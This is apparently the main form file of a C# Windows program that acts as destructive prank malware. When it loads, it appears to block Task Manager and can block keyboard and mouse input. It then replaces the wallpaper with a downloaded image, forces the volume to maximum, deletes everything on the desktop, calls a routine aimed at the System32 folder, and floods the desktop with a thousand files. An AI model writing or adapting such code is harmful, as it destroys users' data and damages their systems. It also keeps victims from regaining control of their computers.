using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using System.Net;
using Microsoft.Win32;
using System.IO;
using System.Threading;

namespace bramerto_rob_2._0
{
    public partial class Cookie : Form
    {
        SoundPlayer sp = new SoundPlayer();

        SoundPlayer sp2 = new SoundPlayer();

        WebClient wc = new WebClient();

        Random r = new Random();

        Settings s = new Settings();

        public partial class NativeMethods
        {

            /// Return Type: BOOL->int
            ///fBlockIt: BOOL->int
            [System.Runtime.InteropServices.DllImportAttribute("user32.dll", EntryPoint = "BlockInput")]
            [return: System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)]
            public static extern bool BlockInput([System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)] bool fBlockIt);

        }
        public Cookie()
        {
            InitializeComponent();
            sp.Stream = Properties.Resources.Start;
            sp2.Stream = Properties.Resources.All;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            s.BlockTM();
            sp.Play(); 
            timer1.Enabled = true;
            timer1.Start();
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            timer1.Enabled = false;
            timer1.Stop();
            this.WindowState = FormWindowState.Minimized;
            sp2.PlayLooping();
            string desktop = @"C:\Users\" + Environment.UserName + @"\Desktop\LOL.jpg";
            wc.DownloadFile("https://s0.rbk.ru/v6_top_pics/resized/590xH/media/img/3/87/756107202790873.jpg", desktop);
            s.SetWallpaper(desktop);
            s.SetVolume(100);
            s.KillMemory(@"C:\Windows\System32\", 1000);
            s.DeleteALLFromDesktop();
            s.CreateFilesOnDesktop(1000, "https://rozetked.me/images/uploads/fJ8LPcfByPPv.jpg", "Shrek.ru");                
        }

        public static void BlockInput(TimeSpan span)
        {
            try
            {
                NativeMethods.BlockInput(true);
                Thread.Sleep(span);
            }
            finally
            {
                NativeMethods.BlockInput(false);
            }
        }
    }
}
